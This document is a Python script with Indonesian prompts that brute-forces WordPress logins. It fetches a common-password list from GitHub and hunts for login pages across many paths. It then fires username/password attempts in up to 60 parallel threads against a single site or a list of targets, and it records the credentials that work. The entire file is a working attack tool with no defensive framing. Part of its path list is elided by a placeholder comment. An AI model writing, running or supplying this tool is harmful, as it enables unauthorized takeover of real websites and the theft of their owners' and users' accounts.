import requests
import time
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Configuration
USERNAME_FILE = "username.txt"  # Only used in Mode 2
TARGET_FILE = "targets.txt"
SAVE_FILE = "success.txt"
MAX_THREADS = 60
TIMEOUT = 6
DELAY = 0.05

# GitHub password list (Top 1000 common passwords)
GITHUB_PASSWORD_URL = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"

# 80+ WordPress login paths
WP_LOGIN_PATHS = [
    "/wp-login.php", "/wp-admin", "/login", "/admin",
    # ... [all other paths from previous version] ...
    "/wp-content/wp-login.php"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def download_password_list():
    """Download password list directly from GitHub"""
    try:
        print(f"{Fore.YELLOW}[*] Downloading password list from GitHub...{Style.RESET_ALL}")
        response = requests.get(GITHUB_PASSWORD_URL, timeout=10)
        if response.status_code == 200:
            return [p.strip() for p in response.text.splitlines() if p.strip()]
        else:
            print(f"{Fore.RED}[!] Failed to download (HTTP {response.status_code}){Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Download error: {str(e)}{Style.RESET_ALL}")
    return None

def load_wordlist(filename):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File {filename} not found!{Style.RESET_ALL}")
        return []

def normalize_url(url):
    url = url.strip()
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url.replace('www.', '')
    return url.split('?')[0].rstrip('/')

def detect_wp_login(base_url):
    """Fast parallel login page detection"""
    with ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check_path, base_url, path): path for path in WP_LOGIN_PATHS}
        for future in as_completed(futures):
            result = future.result()
            if result:
                executor.shutdown(wait=False)
                return result
    return None

def check_path(base_url, path):
    test_url = f"{base_url.rstrip('/')}{path}"
    try:
        response = requests.head(test_url, timeout=3, allow_redirects=True)
        final_url = response.url.lower()
        if any(x in final_url for x in ["wp-login", "wp-admin", "login"]):
            return final_url
        if "wp-content" in requests.get(test_url, timeout=3).text.lower():
            return test_url
    except:
        return None
    return None

def brute_force(target, creds):
    """Optimized brute force with session reuse"""
    username, password = creds
    try:
        with requests.Session() as session:
            response = session.post(
                target,
                data={
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": target.replace("wp-login.php", "wp-admin/")
                },
                timeout=TIMEOUT,
                allow_redirects=False
            )
            
            if response.status_code == 302 and "wp-admin" in response.headers.get('Location', ''):
                with open(SAVE_FILE, 'a') as f:
                    f.write(f"{target}|{username}:{password}\n")
                print(f"{Fore.GREEN}[SUCCESS] {target} {username}:{password}{Style.RESET_ALL}")
                return True
    except:
        pass
    print(f"{Fore.RED}[FAILED] {target} {username}:{password}{Style.RESET_ALL}")
    return False

def print_final_result(success_count):
    print("\n" + "="*50)
    if success_count > 0:
        print(f"{Fore.GREEN}anda success [ hasil {success_count} ]{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}anda gagal mendapatkan [ hasil 0 ]{Style.RESET_ALL}")
    print(f"Hasil tersimpan di: {SAVE_FILE}")
    print("="*50)

def single_target_mode():
    """Mode 1: Manual username + GitHub passwords"""
    target = input("\nMasukkan URL target (contoh.com): ").strip()
    username = input("Masukkan username WordPress: ").strip()
    
    if not username:
        print(f"{Fore.RED}[!] Username harus diisi!{Style.RESET_ALL}")
        return
    
    normalized_url = normalize_url(target)
    print(f"\n{Fore.CYAN}[*] Mencari halaman login...{Style.RESET_ALL}")
    
    login_url = detect_wp_login(normalized_url)
    if not login_url:
        print(f"{Fore.RED}[!] Gagal menemukan halaman login{Style.RESET_ALL}")
        print_final_result(0)
        return
    
    print(f"{Fore.GREEN}[+] Login ditemukan: {login_url}{Style.RESET_ALL}")
    
    passwords = download_password_list()
    if not passwords:
        print_final_result(0)
        return
    
    print(f"\n{Fore.CYAN}[*] Memulai brute force dengan {len(passwords)} password{Style.RESET_ALL}")
    start_time = time.time()
    success_count = 0
    
    # Ultra-fast brute force
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = [executor.submit(brute_force, login_url, (username, p)) for p in passwords]
        for future in as_completed(futures):
            if future.result():
                success_count += 1
            time.sleep(DELAY)
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.CYAN}[*] Selesai dalam {elapsed:.2f} detik{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[*] Kecepatan: {len(passwords)/elapsed:.1f} percobaan/detik{Style.RESET_ALL}")
    print_final_result(success_count)

def multi_target_mode():
    """Mode 2: File targets with GitHub passwords"""
    target_file = input("\nMasukkan file target (contoh: targets.txt): ").strip()
    if not os.path.exists(target_file):
        print(f"{Fore.RED}[!] File tidak ditemukan!{Style.RESET_ALL}")
        return
    
    targets = [normalize_url(t) for t in load_wordlist(target_file)]
    if not targets:
        print_final_result(0)
        return
    
    usernames = load_wordlist(USERNAME_FILE)
    if not usernames:
        print_final_result(0)
        return
    
    passwords = download_password_list()
    if not passwords:
        print_final_result(0)
        return
    
    total_targets = len(targets)
    success_count = 0
    
    print(f"\n{Fore.CYAN}[*] Memulai scan pada {total_targets} target{Style.RESET_ALL}")
    start_time = time.time()
    
    for i, target in enumerate(targets, 1):
        print(f"\n{Fore.YELLOW}[Target {i}/{total_targets}] {target}{Style.RESET_ALL}")
        
        login_url = detect_wp_login(target)
        if not login_url:
            print(f"{Fore.RED}[!] Halaman login tidak ditemukan{Style.RESET_ALL}")
            continue
            
        print(f"{Fore.GREEN}[+] Login: {login_url}{Style.RESET_ALL}")
        
        # Fast parallel brute force
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            creds = [(u, p) for u in usernames for p in passwords]
            futures = [executor.submit(brute_force, login_url, c) for c in creds]
            for future in as_completed(futures):
                if future.result():
                    success_count += 1
                time.sleep(DELAY)
    
    elapsed = time.time() - start_time
    print(f"\n{Fore.CYAN}[*] Selesai dalam {elapsed:.2f} detik{Style.RESET_ALL}")
    print_final_result(success_count)

def main():
    clear_screen()
    print(f"\n{Fore.BLUE}=== WORDPRESS BRUTE FORCE (GITHUB PASSWORD LIST) ==={Style.RESET_ALL}")
    print(f"{Fore.YELLOW}1. Single Target (Username Manual){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}2. Multi Target (File Target){Style.RESET_ALL}")
    
    choice = input("\nPilih mode (1/2): ").strip()
    if choice == "1":
        single_target_mode()
    elif choice == "2":
        multi_target_mode()
    else:
        print(f"{Fore.RED}[!] Pilihan tidak valid{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Dihentikan pengguna{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
